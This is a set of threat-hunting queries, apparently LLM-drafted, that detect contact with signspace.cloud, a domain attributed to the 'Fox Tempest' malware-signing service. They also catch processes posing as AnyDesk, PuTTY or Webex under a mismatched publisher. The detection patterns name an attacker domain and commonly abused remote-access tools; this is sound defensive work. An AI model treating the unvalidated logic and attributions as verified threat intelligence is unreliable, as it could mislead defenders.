Detects DNS resolution or HTTP(S) egress to signspace.cloud, the Fox Tempest malware-signing-as-a-service portal disrupted by Microsoft DCU in May 2026. Any historical or stale endpoint contacting this domain indicates either a Fox Tempest customer (i.e. compromise actor) or a Fox Tempest-signed payload still beaconing for refresh. Rationale: signspace[.]cloud is named in the article body as Fox Tempest's MSaaS portal and is the sole domain in IOC Table 2 (Type=Domain, first-seen 2025-05-29, last-seen 2026-05-05). The 365-day lookback aligns with the portal's full operational window. Process-context fields surface which binary on the endpoint initiated the contact — a browser hit suggests an actor accessing the portal, a non-browser hit suggests a Fox Tempest-signed payload phoning home.
ATT&CKT1071.001 T1568
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic Web.Proxy
// Fox Tempest MSaaS portal contact — signspace.cloud was active 2025-05-29 to 2026-05-05
let Lookback = 365d;
union
(DeviceNetworkEvents
 | where Timestamp > ago(Lookback)
 | where RemoteUrl has "signspace.cloud" or RemoteUrl has "signspace[.]cloud"
 | project Timestamp, DeviceName, EvidenceSurface = "Network",
           InitiatingProcessAccountName, InitiatingProcessFileName,
           InitiatingProcessFolderPath, InitiatingProcessCommandLine,
           RemoteUrl, RemoteIP, RemotePort),
(DeviceEvents
 | where Timestamp > ago(Lookback)
 | where ActionType in ("DnsQueryResponse", "ConnectionSuccess")
 | where RemoteUrl has "signspace.cloud" or AdditionalFields has "signspace.cloud"
 | project Timestamp, DeviceName, EvidenceSurface = ActionType,
           InitiatingProcessAccountName, InitiatingProcessFileName,
           InitiatingProcessFolderPath, InitiatingProcessCommandLine,
           RemoteUrl, RemoteIP, RemotePort)
| where InitiatingProcessAccountName !endswith "$"
| order by Timestamp desc
let Lookback = 365d;
union
(ImDnsActivity
 | where TimeGenerated > ago(Lookback)
 | where DnsQuery has "signspace.cloud"
 | project TimeGenerated, DvcHostname, SrcIpAddr, SrcUsername,
           EvidenceSurface = "DNS",
           DnsQuery, DnsQueryTypeName, DnsResponseName),
(ImWebSession
 | where TimeGenerated > ago(Lookback)
 | where Url has "signspace.cloud" or HttpHostName has "signspace.cloud"
 | project TimeGenerated, DvcHostname, SrcIpAddr, SrcUsername,
           EvidenceSurface = "Web",
           DnsQuery = HttpHostName, DnsQueryTypeName = "", DnsResponseName = Url),
(CommonSecurityLog
 | where TimeGenerated > ago(Lookback)
 | where RequestURL has "signspace.cloud" or DestinationDnsDomain has "signspace.cloud"
 | project TimeGenerated, DvcHostname = SourceHostName, SrcIpAddr = SourceIP,
           SrcUsername = SourceUserName, EvidenceSurface = "Proxy",
           DnsQuery = DestinationDnsDomain, DnsQueryTypeName = "",
           DnsResponseName = RequestURL)
| order by TimeGenerated desc

[LLM] Masqueraded AnyDesk/PuTTY/Webex binary with non-canonical publisher metadata Delivery Medium
Hunts for processes named or branded as AnyDesk/PuTTY/Webex/Teams whose PE version-info company name does NOT match the canonical software vendor, surfacing Fox Tempest-signed malware abusing the MSaaS pipeline to ship trojanised look-alikes of the four legitimate products explicitly called out in the article. Pairs masquerade-name with company-name mismatch to suppress legitimate enterprise repackaging. Rationale: Article body explicitly enumerates the four products Fox Tempest masquerades signed payloads as: AnyDesk, Teams, Putty, and Webex. Pairing the legitimate filename / product-name with a publisher-mismatch and out-of-canonical-path narrows to genuine masquerade attempts and excludes real vendor installs that live in Program Files with the matching publisher. Teams is intentionally excluded from the company-name check (legitimate Teams IS signed by Microsoft, same as the Fox Tempest-abused Artifact Signing service — that pair is indistinguishable on cert metadata alone and would generate too many FPs).
ATT&CKT1036.005 T1553.002
Data sourcesEndpoint.Processes
// Hunt: binaries masquerading as AnyDesk / PuTTY / Webex per Fox Tempest's stated targets
// Article: "masquerade as legitimate software (like AnyDesk, Teams, Putty, and Webex)"
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("anydesk.exe", "putty.exe", "webex.exe", "webexmta.exe", "webexteams.exe", "webexhost.exe")
   or ProcessVersionInfoProductName has_any ("AnyDesk", "PuTTY", "Webex")
| where AccountName !endswith "$"
// Expected canonical company-name per product (verified against vendor releases)
| extend ExpectedCompany = case(
    FileName =~ "anydesk.exe" or ProcessVersionInfoProductName has "AnyDesk", "AnyDesk Software GmbH",
    FileName =~ "putty.exe"  or ProcessVersionInfoProductName has "PuTTY",   "Simon Tatham",
    FileName in~ ("webex.exe", "webexmta.exe", "webexteams.exe", "webexhost.exe") or ProcessVersionInfoProductName has "Webex", "Cisco",
    "")
| where ExpectedCompany != ""
| where isempty(ProcessVersionInfoCompanyName) or not(ProcessVersionInfoCompanyName has ExpectedCompany)
// Exclude canonical Program Files install locations
| where not(FolderPath startswith @"C:\Program Files\AnyDesk")
    and not(FolderPath startswith @"C:\Program Files (x86)\AnyDesk")
    and not(FolderPath startswith @"C:\Program Files\PuTTY")
    and not(FolderPath startswith @"C:\Program Files (x86)\PuTTY")
    and not(FolderPath startswith @"C:\Program Files\Cisco\Webex")
    and not(FolderPath startswith @"C:\Program Files (x86)\Cisco\Webex")
    and not(FolderPath startswith @"C:\Program Files\Webex")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath,
          ClaimedProduct = ProcessVersionInfoProductName,
          ClaimedCompany = ProcessVersionInfoCompanyName,
          ExpectedCompany, SHA256, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessFolderPath
| order by Timestamp desc
// Sentinel: same masquerade hunt via ASIM ImProcessCreate
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("anydesk.exe", "putty.exe", "webex.exe", "webexmta.exe", "webexteams.exe", "webexhost.exe")
   or ActingProcessFileProduct has_any ("AnyDesk", "PuTTY", "Webex")
| where ActorUsername !endswith "$"
| extend ExpectedCompany = case(
    ActingProcessName has "anydesk.exe" or ActingProcessFileProduct has "AnyDesk", "AnyDesk Software GmbH",
    ActingProcessName has "putty.exe"  or ActingProcessFileProduct has "PuTTY",   "Simon Tatham",
    ActingProcessName has_any ("webex.exe", "webexmta.exe", "webexteams.exe", "webexhost.exe") or ActingProcessFileProduct has "Webex", "Cisco",
    "")
| where ExpectedCompany != ""
| where isempty(ActingProcessFileCompany) or not(ActingProcessFileCompany has ExpectedCompany)
| where not(ActingProcessCommandLine has @"C:\Program Files\AnyDesk")
    and not(ActingProcessCommandLine has @"C:\Program Files (x86)\AnyDesk")
    and not(ActingProcessCommandLine has @"C:\Program Files\PuTTY")
    and not(ActingProcessCommandLine has @"C:\Program Files (x86)\PuTTY")
    and not(ActingProcessCommandLine has @"C:\Program Files\Cisco\Webex")
    and not(ActingProcessCommandLine has @"C:\Program Files (x86)\Cisco\Webex")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          ClaimedProduct = ActingProcessFileProduct,
          ClaimedCompany = ActingProcessFileCompany,
          ExpectedCompany, SHA256, ActingProcessCommandLine,
          ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
source:windows.sysmon @EventID:1 (@Image:(*\\anydesk.exe OR *\\AnyDesk.exe OR *\\putty.exe OR *\\PuTTY.exe OR *\\webex.exe OR *\\Webex.exe OR *\\webexmta.exe OR *\\webexteams.exe OR *\\webexhost.exe) OR @Product:(AnyDesk OR PuTTY OR Webex)) -@Image:(*\\Program?Files\\AnyDesk\\* OR *\\Program?Files\\PuTTY\\* OR *\\Program?Files\\Cisco\\Webex\\* OR *\\Program?Files?(x86)\\AnyDesk\\* OR *\\Program?Files?(x86)\\PuTTY\\* OR *\\Program?Files?(x86)\\Cisco\\Webex\\*) -@Company:("AnyDesk Software GmbH" OR "Simon Tatham" OR "Cisco Systems, Inc." OR "Cisco WebEx LLC")
#event_simpleName=ProcessRollup2 ImageFileName=/\\(anydesk|putty|webex|webexmta|webexteams|webexhost)\.exe$/i
| NOT ImageFileName=/\\Program Files( \(x86\))?\\(AnyDesk|PuTTY|Cisco\\Webex|Webex)\\/i
| UserName!=/\$$/
| groupBy([aid, ComputerName, ImageFileName, CommandLine, SHA256HashData, ParentBaseFileName], function=count())
